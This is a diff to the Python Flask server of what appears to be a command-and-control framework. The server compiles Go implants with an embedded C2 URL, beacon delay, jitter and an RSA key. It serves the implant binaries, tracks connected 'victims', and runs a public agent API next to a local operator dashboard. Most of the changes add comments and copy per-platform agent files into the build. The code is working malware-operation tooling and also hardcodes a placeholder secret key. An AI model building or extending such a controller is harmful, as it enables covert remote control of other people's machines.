@@ -41,15 +41,15 @@ def clean_old_agents(goos, goarch):
         os.remove(f)
 
 # ---------- Create the two Flask apps ----------
-agent_app = Flask(__name__)
+agent_app = Flask(__name__)                     # for agent communication (public)
 agent_app.config['SECRET_KEY'] = 'change-this-in-production'
 dashboard_app = Flask(__name__, template_folder='../web/templates', static_folder='../web/static')
 dashboard_app.config['SECRET_KEY'] = 'change-this-in-production'
 
-# WebSocket only for the dashboard
+# WebSocket only for the dashboard (real‑time updates)
 socketio = SocketIO(dashboard_app, cors_allowed_origins="*", async_mode='threading')
 
-# Instantiate managers (shared)
+# Instantiate managers (shared between both apps)
 victim_mgr = VictimManager(socketio)
 port_event_mgr = PortEventManager()
 port_mgr = PortManager(victim_mgr, port_event_mgr, socketio)
@@ -81,13 +81,18 @@ def build_agent_impl(data):
     if jitter < 0:
         jitter = 0
 
-    template_path = os.path.join(os.path.dirname(__file__), "../agents/go/agent.go")
-    if not os.path.exists(template_path):
+    # Read the main agent template (common code)
+    common_path = os.path.join(os.path.dirname(__file__), '../agents/go/agent.go')
+    unix_path = os.path.join(os.path.dirname(__file__), '../agents/go/agent_unix.go')
+    win_path = os.path.join(os.path.dirname(__file__), '../agents/go/agent_windows.go')
+
+    if not os.path.exists(common_path):
         return {'error': 'Agent template not found'}, 500
 
-    with open(template_path, 'r') as f:
+    with open(common_path, 'r') as f:
         agent_code = f.read()
 
+    # Generate RSA keypair if authentication enabled
     public_key_pem = ""
     if enable_auth:
         private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
@@ -104,6 +109,7 @@ def build_agent_impl(data):
         agent_mgr.store_rsa_keypair(version, platform, private_key_pem, public_key_pem)
         public_key_pem = public_key_pem.replace('`', '` + "`" + `')
 
+    # Replace placeholders in the common template
     agent_code = agent_code.replace('{{ .C2URL }}', c2_url)
     agent_code = agent_code.replace('{{ .BeaconDelay }}', str(beacon_delay))
     agent_code = agent_code.replace('{{ .Jitter }}', str(jitter))
@@ -115,11 +121,30 @@ def build_agent_impl(data):
     agent_code = agent_code.replace('{{ .EnableAuth }}', str(enable_auth).lower())
     agent_code = agent_code.replace('{{ .ServerPublicKey }}', public_key_pem)
 
+    # Create temporary directory
     temp_dir = tempfile.mkdtemp()
+
+    # Write main.go
     go_file = os.path.join(temp_dir, 'main.go')
     with open(go_file, 'w') as f:
         f.write(agent_code)
 
+    # Copy platform‑specific files (if they exist)
+    if os.path.exists(unix_path):
+        with open(unix_path, 'r') as uf:
+            unix_code = uf.read()
+        unix_go_file = os.path.join(temp_dir, 'agent_unix.go')
+        with open(unix_go_file, 'w') as uf:
+            uf.write(unix_code)
+
+    if os.path.exists(win_path):
+        with open(win_path, 'r') as wf:
+            win_code = wf.read()
+        win_go_file = os.path.join(temp_dir, 'agent_windows.go')
+        with open(win_go_file, 'w') as wf:
+            wf.write(win_code)
+
+    # Initialise Go module
     subprocess.run(['go', 'mod', 'init', 'minotaur-agent'], cwd=temp_dir, capture_output=True, text=True)
     subprocess.run(['go', 'mod', 'tidy'], cwd=temp_dir, capture_output=True, text=True)
 
@@ -153,6 +178,7 @@ def build_agent_impl(data):
     storage_path = os.path.join(version_dir, output_name)
     shutil.copy(binary_path, storage_path)
 
+    # Record version in database
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS agent_versions (
@@ -179,7 +205,7 @@ def build_agent_impl(data):
     shutil.rmtree(temp_dir)
     return {'status': 'success', 'version': version, 'platform': platform, 'filename': output_name}, 200
 
-# ---------- Agent API routes (port 5000) ----------
+# ---------- Agent API endpoints (served on port 5000) ----------
 @agent_app.route('/api/agent/authenticate', methods=['POST'])
 def agent_authenticate():
     data = request.json
@@ -275,7 +301,16 @@ def get_agent_versions_api():
     c.execute("SELECT platform, version FROM agent_current_version")
     current = {row[0]: row[1] for row in c.fetchall()}
     conn.close()
-    versions = [{'version': r[0], 'platform': r[1], 'filename': r[2], 'compiled_at': r[3], 'size': r[4] or 0, 'is_current': current.get(r[1]) == r[0]} for r in rows]
+    versions = []
+    for r in rows:
+        versions.append({
+            'version': r[0],
+            'platform': r[1],
+            'filename': r[2],
+            'compiled_at': r[3],
+            'size': r[4] if r[4] is not None else 0,
+            'is_current': current.get(r[1]) == r[0]
+        })
     return jsonify(versions)
 
 @agent_app.route('/api/agent/set_current_version', methods=['POST'])
@@ -346,7 +381,7 @@ def list_agent_files_api():
 def serve_agent_binary(filename):
     return send_from_directory(AGENT_STORAGE, filename)
 
-# ---------- Dashboard routes (port 5001) ----------
+# ---------- Dashboard endpoints (served on port 5001, localhost) ----------
 @dashboard_app.route('/')
 def index():
     return render_template('dashboard.html')
@@ -420,12 +455,13 @@ def clear_all_agents():
     agent_mgr.clear_all_agents()
     return jsonify({'status': 'cleared'})
 
+# Build endpoint is also needed on dashboard because the frontend calls it from port 5001
 @dashboard_app.route('/api/build_agent', methods=['POST'])
 def build_agent_dashboard():
     resp, code = build_agent_impl(request.json)
     return jsonify(resp), code
 
-# Version management endpoints for dashboard (so the frontend works)
+# Version management endpoints for dashboard
 @dashboard_app.route('/api/agent/versions', methods=['GET'])
 def get_agent_versions_dashboard():
     conn = sqlite3.connect(DB_PATH)
@@ -435,7 +471,16 @@ def get_agent_versions_dashboard():
     c.execute("SELECT platform, version FROM agent_current_version")
     current = {row[0]: row[1] for row in c.fetchall()}
     conn.close()
-    versions = [{'version': r[0], 'platform': r[1], 'filename': r[2], 'compiled_at': r[3], 'size': r[4] or 0, 'is_current': current.get(r[1]) == r[0]} for r in rows]
+    versions = []
+    for r in rows:
+        versions.append({
+            'version': r[0],
+            'platform': r[1],
+            'filename': r[2],
+            'compiled_at': r[3],
+            'size': r[4] if r[4] is not None else 0,
+            'is_current': current.get(r[1]) == r[0]
+        })
     return jsonify(versions)
 
 @dashboard_app.route('/api/agent/set_current_version', methods=['POST'])
@@ -625,7 +670,7 @@ def export_logs():
     data = BytesIO(content.encode('utf-8'))
     return send_file(data, as_attachment=True, download_name=filename, mimetype='text/plain')
 
-# WebSocket events
+# WebSocket events for dashboard (real‑time)
 @socketio.on('connect')
 def handle_connect():
     logger.info(f"Dashboard client connected: {request.sid}")
@@ -634,7 +679,7 @@ def handle_connect():
 def handle_disconnect():
     logger.info(f"Dashboard client disconnected: {request.sid}")
 
-# ---------- Run both servers ----------
+# ---------- Run both servers on separate threads ----------
 def run_agent_api():
     agent_app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
 
@@ -642,6 +687,8 @@ def run_dashboard():
     socketio.run(dashboard_app, host='127.0.0.1', port=5001, debug=False, use_reloader=False)
 
 if __name__ == '__main__':
+    # Start the agent API in a background thread
     agent_thread = threading.Thread(target=run_agent_api, daemon=True)
     agent_thread.start()
+    # Run the dashboard in the main thread
     run_dashboard()
